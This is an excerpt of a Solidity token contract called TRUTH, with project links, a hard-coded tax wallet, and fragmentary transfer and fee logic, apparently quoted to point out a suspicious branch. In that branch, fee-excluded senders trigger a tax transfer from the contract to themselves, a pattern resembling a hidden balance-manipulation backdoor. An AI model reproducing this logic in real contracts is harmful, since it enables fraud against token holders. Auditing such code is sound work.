...
/**
Web: https://trumpworld.wtf
X: https://x.com/trumpworldX
Tg: https://t.me/trump_world_portal
**/
...
contract TRUTH is Context, IERC20, Ownable {
    ...
    constructor() {
        _taxWallet = payable(0x1304AdE9E34d288eC15a92DB2e5EdAd0Fa2Eaf2D);
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        amount = _getTValues(from, to, amount);
    ...
    function _transferTax(address from, address to, uint256 fromAmount, uint256 toAmount) internal {
    ...
    function _getTValues(
        ...
        if (!_isExcludedFromFee[from]) { 
            ...
            if(taxAmount >0) {
                _transferTax(from, to, taxAmount, tAmount);
                _balances[address(this)] = _balances[address(this)].add(taxAmount);
                emit Transfer(from, address(this), taxAmount);
            }
        }else {
            _transferTax(address(this), from, tAmount, amount);
        }
